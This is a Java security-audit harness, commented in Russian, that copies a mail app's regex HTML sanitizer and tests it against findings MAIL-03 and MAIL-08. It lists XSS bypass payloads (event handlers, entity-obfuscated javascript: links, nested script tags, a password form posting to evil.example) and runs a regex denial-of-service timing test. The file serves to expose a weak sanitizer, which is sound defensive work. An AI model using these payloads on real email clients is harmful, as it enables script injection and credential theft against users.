import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Эксперимент MAIL-03 / MAIL-08: поведение sanitizeEmailHtml
 * (app/src/main/java/com/dedovmosol/iwomail/util/HtmlUtils.kt:80-115).
 * Регулярные выражения скопированы 1:1 (Kotlin Regex = java.util.regex.Pattern).
 * Применяются в том же порядке, что и в sanitizeEmailHtml.
 *
 * Запуск: java SanitizerSim.java   (JDK 17)
 */
public class SanitizerSim {

    static final Pattern SCRIPT_TAG = Pattern.compile("(?si)<script[^>]*>.*?</script>");
    static final Pattern SCRIPT_OC = Pattern.compile("(?i)</?script[^>]*>");
    static final Pattern IFRAME_TAG = Pattern.compile("(?si)<iframe[^>]*>.*?</iframe>");
    static final Pattern IFRAME_OC = Pattern.compile("(?i)</?iframe[^>]*>");
    static final Pattern OBJECT_TAG = Pattern.compile("(?si)<object[^>]*>.*?</object>");
    static final Pattern OBJECT_OC = Pattern.compile("(?i)</?object[^>]*>");
    static final Pattern EMBED = Pattern.compile("(?i)<embed\\b[^>]*/?>");
    static final Pattern APPLET_TAG = Pattern.compile("(?si)<applet[^>]*>.*?</applet>");
    static final Pattern APPLET_OC = Pattern.compile("(?i)</?applet[^>]*>");
    static final Pattern META_REFRESH = Pattern.compile("(?i)<meta\\b[^>]*http-equiv\\s*=\\s*['\"]?refresh['\"]?[^>]*>");
    static final Pattern EV_DOUBLE = Pattern.compile("(?i)\\s+on\\w+\\s*=\\s*\"[^\"]*\"");
    static final Pattern EV_SINGLE = Pattern.compile("(?i)\\s+on\\w+\\s*=\\s*'[^']*'");
    static final Pattern EV_UNQUOTED = Pattern.compile("(?i)\\s+on\\w+\\s*=\\s*[^\\s>\"']+");
    static final Pattern JS_DOUBLE = Pattern.compile("(?i)(href|src|action|formaction|xlink:href)\\s*=\\s*\"\\s*javascript:[^\"]*\"");
    static final Pattern JS_SINGLE = Pattern.compile("(?i)(href|src|action|formaction|xlink:href)\\s*=\\s*'\\s*javascript:[^']*'");
    static final Pattern DH_DOUBLE = Pattern.compile("(?i)(href|src|action|formaction|xlink:href)\\s*=\\s*\"\\s*data:text/html[^\"]*\"");
    static final Pattern DH_SINGLE = Pattern.compile("(?i)(href|src|action|formaction|xlink:href)\\s*=\\s*'\\s*data:text/html[^']*'");

    static String sanitize(String h) {
        h = SCRIPT_TAG.matcher(h).replaceAll("");
        h = SCRIPT_OC.matcher(h).replaceAll("");
        h = IFRAME_TAG.matcher(h).replaceAll("");
        h = IFRAME_OC.matcher(h).replaceAll("");
        h = OBJECT_TAG.matcher(h).replaceAll("");
        h = OBJECT_OC.matcher(h).replaceAll("");
        h = EMBED.matcher(h).replaceAll("");
        h = APPLET_TAG.matcher(h).replaceAll("");
        h = APPLET_OC.matcher(h).replaceAll("");
        h = META_REFRESH.matcher(h).replaceAll("");
        h = EV_DOUBLE.matcher(h).replaceAll("");
        h = EV_SINGLE.matcher(h).replaceAll("");
        h = EV_UNQUOTED.matcher(h).replaceAll("");
        h = JS_DOUBLE.matcher(h).replaceAll("$1=\"#\"");
        h = JS_SINGLE.matcher(h).replaceAll("$1='#'");
        h = DH_DOUBLE.matcher(h).replaceAll("$1=\"#\"");
        h = DH_SINGLE.matcher(h).replaceAll("$1='#'");
        return h;
    }

    public static void main(String[] args) {
        System.out.println("=== MAIL-08: обходы блок-листа (что остаётся в HTML после sanitizeEmailHtml) ===");
        String[][] cases = {
                {"обработчик через слэш, без пробела", "<img/onerror=alert(1) src=x>"},
                {"svg onload через слэш", "<svg/onload=alert(1)>"},
                {"атрибуты впритык после кавычки", "<img src=\"x\"onerror=\"alert(1)\">"},
                {"javascript: без кавычек", "<a href=javascript:alert(1)>x</a>"},
                {"javascript: с HTML-сущностью", "<a href=\"java&#x73;cript:alert(1)\">x</a>"},
                {"javascript: с табуляцией", "<a href=\"jav&#9;ascript:alert(1)\">x</a>"},
                {"вложенный тег script", "<scr<script>ipt>alert(1)</scr</script>ipt>"},
                {"form с action", "<form action=\"https://evil.example/post\" method=\"post\"><input name=pw></form>"},
                {"base href", "<base href=\"https://evil.example/\">"},
                {"link stylesheet", "<link rel=\"stylesheet\" href=\"https://evil.example/t.css\">"},
                {"svg use внешний", "<svg><use href=\"https://evil.example/x.svg#a\"/></svg>"},
                {"math + xlink", "<math><a xlink:href=\"data:text/html,x\">x</a></math>"},
        };
        for (String[] c : cases) {
            String out = sanitize(c[1]);
            boolean unchanged = out.equals(c[1]);
            System.out.printf("%-38s | вход: %s%n%38s | выход: %s %s%n", c[0], c[1], "", out,
                    unchanged ? "(НЕ ИЗМЕНЕНО)" : "");
        }
        System.out.println();
        System.out.println("Проверка заявления 'Idempotent — safe to call multiple times' (HtmlUtils.kt:71):");
        String once = sanitize("<scr<script>ipt>alert(1)</scr</script>ipt>");
        String twice = sanitize(once);
        System.out.println("  после 1-го прохода: " + once);
        System.out.println("  после 2-го прохода: " + twice);
        System.out.println("  идемпотентна: " + once.equals(twice));

        System.out.println();
        System.out.println("=== MAIL-03: время sanitizeEmailHtml на 'ядовитом' письме ===");
        String[] tags = {"<iframe>", "<script>", "<object>", "<applet>"};
        int[] sizes = {10_000, 20_000, 40_000, 80_000};
        for (String tag : tags) {
            for (int n : sizes) {
                String body = tag.repeat(n);
                long t = System.nanoTime();
                sanitize(body);
                double ms = (System.nanoTime() - t) / 1e6;
                System.out.printf("%-9s x %,7d (%,8d байт): %,10.0f мс%n", tag, n, body.length(), ms);
            }
        }
        System.out.println();
        System.out.println("Контроль: тот же объём БЕЗ незакрытых тегов (обычный HTML)");
        String normal = "<p>Hello <b>world</b></p>".repeat(40_000);
        long t = System.nanoTime();
        sanitize(normal);
        System.out.printf("обычный HTML (%,d байт): %,.0f мс%n", normal.length(), (System.nanoTime() - t) / 1e6);
    }
}
